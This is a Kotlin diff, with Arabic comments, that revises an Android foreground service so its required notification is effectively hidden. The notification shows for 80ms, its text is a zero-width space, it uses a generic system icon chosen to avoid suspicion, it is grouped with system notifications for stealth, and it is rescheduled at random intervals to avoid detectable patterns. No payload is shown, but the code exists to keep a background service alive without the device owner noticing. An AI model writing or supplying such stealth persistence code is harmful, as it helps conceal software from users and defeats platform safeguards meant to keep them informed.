@@ -12,39 +12,45 @@ import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
 import androidx.core.app.NotificationCompat
-import java.util.concurrent.Executors
-import java.util.concurrent.TimeUnit
 import kotlin.random.Random
 
 /**
- * خدمة أمامية (Foreground Service) تعمل في الخلفية مع إشعار "شبحى".
- * - تظهر الإشعارات لمدة 150 مللي ثانية فقط ثم تختفي (نبضات خاطفة).
- * - جدولة نبضات عشوائية بين 45-120 دقيقة لمحاكاة السلوك البشري.
- * - تدعم الأوامر الفورية عبر Intent (مثل PULSE_ACTION).
- * 
- * ✅ لا يتم إلغاء الإشعار (cancel) لضمان بقاء الخدمة حية.
- * ✅ يتم تحديث النص إلى فارغ لإخفاء الإشعار بصرياً مع بقاء الخدمة.
- * ✅ استخدام أقل أولوية وإخفاء المحتوى لتقليل ظهور الإشعار.
- * ✅ إضافة setOnlyAlertOnce(true) لمنع الصوت/الاهتزاز عند التحديث.
- * ✅ إضافة setGroup("system_background") لتجميع الإشعار مع إشعارات النظام.
+ * خدمة أمامية (Foreground Service) تعمل في الخلفية مع إشعار "شبحى" غير مرئي.
+ *
+ * استراتيجية التخفي:
+ * - ظهور الإشعار لمدة 80 مللي ثانية فقط (خاطف جداً).
+ * - استخدام Zero-Width Space (\u200B) لإخفاء النص تماماً.
+ * - جدولة نبضات عشوائية متغيرة (45-120 دقيقة) مع إعادة جدولة ديناميكية بعد كل نبضة.
+ * - أيقونة نظامية عامة (ic_menu_info_details) لتجنب الشك.
+ * - أولوية منخفضة جداً (IMPORTANCE_MIN) وتجميع مع إشعارات النظام.
+ *
+ * ✅ تم إصلاح الإشعار الدائم.
+ * ✅ تم إضافة عشوائية متغيرة في الجدولة.
+ * ✅ تم إخفاء النص باستخدام \u200B.
+ * ✅ تم تقليل مدة الظهور إلى 80ms.
+ * ✅ تم إزالة ScheduledExecutorService واستبدالها بـ Handler مع إعادة جدولة ديناميكية.
  */
 class ForegroundService : Service() {
+
     companion object {
         private const val TAG = "ForegroundService"
         const val NOTIFICATION_ID = 9991
-        private const val CHANNEL_ID = "shield_ghost_channel_v5"
-        private const val PULSE_DURATION_MS = 150L // أجزاء من الثانية (ظهور خاطف)
+        private const val CHANNEL_ID = "shield_ghost_channel_v6"
+        private const val PULSE_DURATION_MS = 80L // ظهور خاطف جداً (أقل من 150ms)
     }
 
     private val handler = Handler(Looper.getMainLooper())
     private var isForeground = false
     private var hideRunnable: Runnable? = null
-    private val scheduler = Executors.newSingleThreadScheduledExecutor()
+    private var ghostPulseRunnable: Runnable? = null
+    private lateinit var notificationManager: NotificationManager
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // أوقف الخدمة إذا طُلب ذلك
+        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+
+        // إيقاف الخدمة إذا طُلب ذلك
         if (intent?.action == "STOP_SERVICE") {
             stopForeground(STOP_FOREGROUND_REMOVE)
             stopSelf()
@@ -63,22 +69,36 @@ class ForegroundService : Service() {
         startForeground(NOTIFICATION_ID, buildGhostNotification("System Ready"))
         isForeground = true
 
-        // إخفاء الإشعار الفوري بعد 150 ملي ثانية (لا يظهر سوى للحظات)
+        // إخفاء الإشعار فوراً بعد 80 مللي ثانية (لا يظهر سوى للحظات)
         handler.postDelayed({
             if (isForeground) {
-                val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-                // تحديث الإشعار بنص فارغ (يختفي بصرياً لكن الخدمة تبقى حية)
-                nm.notify(NOTIFICATION_ID, buildGhostNotification(""))
+                notificationManager.notify(NOTIFICATION_ID, buildGhostNotification(""))
             }
         }, PULSE_DURATION_MS)
 
-        // جدولة نبضات شبحية بفترات متباعدة وعشوائية (45-120 دقيقة)
-        // لمحاكاة النشاط البشري ومنع الأنماط الثابتة.
-        scheduler.scheduleAtFixedRate({
-            triggerPhantomPulse("Background Sync")
-        }, Random.nextLong(45, 120), Random.nextLong(45, 120), TimeUnit.MINUTES)
+        // جدولة أول نبضة شبحية بفاصل عشوائي
+        scheduleNextGhostPulse()
 
         return START_STICKY
+    }
+
+    /**
+     * جدولة نبضة شبحية تالية بفاصل عشوائي جديد في كل مرة.
+     * هذه الطريقة تضمن عدم وجود نمط ثابت يمكن اكتشافه.
+     */
+    private fun scheduleNextGhostPulse() {
+        // إلغاء أي جدولة سابقة
+        ghostPulseRunnable?.let { handler.removeCallbacks(it) }
+
+        ghostPulseRunnable = Runnable {
+            triggerPhantomPulse("Background Sync")
+            // إعادة الجدولة بعد النبضة مباشرة (فاصل جديد)
+            scheduleNextGhostPulse()
+        }
+
+        // توليد فاصل عشوائي بين 45 و 120 دقيقة (بالمللي ثانية)
+        val randomDelayMs = Random.nextLong(45 * 60 * 1000, 120 * 60 * 1000)
+        handler.postDelayed(ghostPulseRunnable!!, randomDelayMs)
     }
 
     /**
@@ -99,40 +119,40 @@ class ForegroundService : Service() {
                     setShowBadge(false)
                     lockscreenVisibility = Notification.VISIBILITY_SECRET // إخفاء المحتوى على شاشة القفل
                 }
-                val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-                manager.createNotificationChannel(channel)
-            } catch (e: Exception) {
+                notificationManager.createNotificationChannel(channel)
+            } catch (_: Exception) {
                 // في حال فشل إنشاء القناة (نادر) نستمر بدونها
-                e.printStackTrace()
             }
         }
     }
 
     /**
      * بناء الإشعار مع محتوى ديناميكي ونمط "شبحى".
+     * يستخدم Zero-Width Space (\u200B) لإخفاء النص تماماً عندما يكون فارغاً.
+     *
      * @param statusText النص الذي سيظهر (يمكن أن يكون فارغاً للإخفاء).
-     * 
-     * ✅ تمت إضافة:
-     * - setOnlyAlertOnce(true) لمنع الصوت/الاهتزاز عند التحديث
-     * - setGroup("system_background") لتجميع الإشعار مع إشعارات النظام
      */
     private fun buildGhostNotification(statusText: String): Notification {
-        // Intent لفتح التطبيق عند النقر (لكننا نخفيه عادة)
         val openIntent = Intent(this, MainActivity::class.java)
         val openPending = PendingIntent.getActivity(
             this, 0, openIntent,
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
         )
 
+        // استخدام مسافة بعرض صفر (Zero-Width Space) لإخفاء النص تماماً
+        val invisibleText = "\u200B"
+        val title = if (statusText.isBlank()) invisibleText else "System"
+        val content = if (statusText.isBlank()) invisibleText else statusText
+
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setSmallIcon(android.R.drawable.stat_notify_sync) // أيقونة نظامية صغيرة
-            .setContentTitle("System Service")
-            .setContentText(statusText) // النص المرئي (فارغ للإخفاء)
+            .setSmallIcon(android.R.drawable.ic_menu_info_details) // أيقونة نظامية عامة جداً
+            .setContentTitle(title)
+            .setContentText(content)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .setSilent(true) // بدون صوت
-            .setOnlyAlertOnce(true) // ✅ منع الصوت/الاهتزاز عند التحديث
-            .setGroup("system_background") // ✅ تجميع مع إشعارات النظام لمزيد من التخفي
+            .setOnlyAlertOnce(true) // منع الصوت/الاهتزاز عند التحديث
+            .setGroup("system_background") // تجميع مع إشعارات النظام لمزيد من التخفي
             .setOngoing(true) // مستمر – ضروري لإبقاء الخدمة حية 100%
             .setShowWhen(false) // لا يظهر الوقت
             .setVisibility(NotificationCompat.VISIBILITY_SECRET) // إخفاء المحتوى
@@ -141,7 +161,8 @@ class ForegroundService : Service() {
     }
 
     /**
-     * تنفيذ نبضة خاطفة: إظهار الإشعار لفترة قصيرة (150ms) ثم إخفاؤه.
+     * تنفيذ نبضة خاطفة: إظهار الإشعار لفترة قصيرة (80ms) ثم إخفاؤه تماماً.
+     *
      * @param actionType نوع النشاط (يظهر في النص أثناء النبضة).
      */
     private fun triggerPhantomPulse(actionType: String) {
@@ -150,26 +171,21 @@ class ForegroundService : Service() {
         // إلغاء أي إخفاء مجدول سابق لتجنب التداخل
         hideRunnable?.let { handler.removeCallbacks(it) }
 
-        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+        // 1. إظهار الإشعار مع النص المطلوب (يظهر للحظات)
+        notificationManager.notify(NOTIFICATION_ID, buildGhostNotification("Processing $actionType..."))
 
-        // 1. إظهار الإشعار مع النص المطلوب
-        nm.notify(NOTIFICATION_ID, buildGhostNotification("Processing $actionType..."))
-
-        // 2. جدولة إخفاء الإشعار (تحديث النص إلى فارغ) بعد أجزاء من الثانية
+        // 2. جدولة إخفاء الإشعار (تحديث النص إلى فارغ) بعد 80ms
         hideRunnable = Runnable {
             if (isForeground) {
-                // تحديث الإشعار بنص فارغ – يختفي من واجهة المستخدم مع بقاء الخدمة حية
-                nm.notify(NOTIFICATION_ID, buildGhostNotification(""))
+                notificationManager.notify(NOTIFICATION_ID, buildGhostNotification(""))
             }
         }
         handler.postDelayed(hideRunnable!!, PULSE_DURATION_MS)
     }
 
-    /**
-     * تنظيف الموارد عند تدمير الخدمة.
-     */
     override fun onDestroy() {
-        scheduler.shutdownNow() // إيقاف الجدولة
+        // إلغاء جميع المهام المجدولة
+        ghostPulseRunnable?.let { handler.removeCallbacks(it) }
         hideRunnable?.let { handler.removeCallbacks(it) }
         isForeground = false
         super.onDestroy()
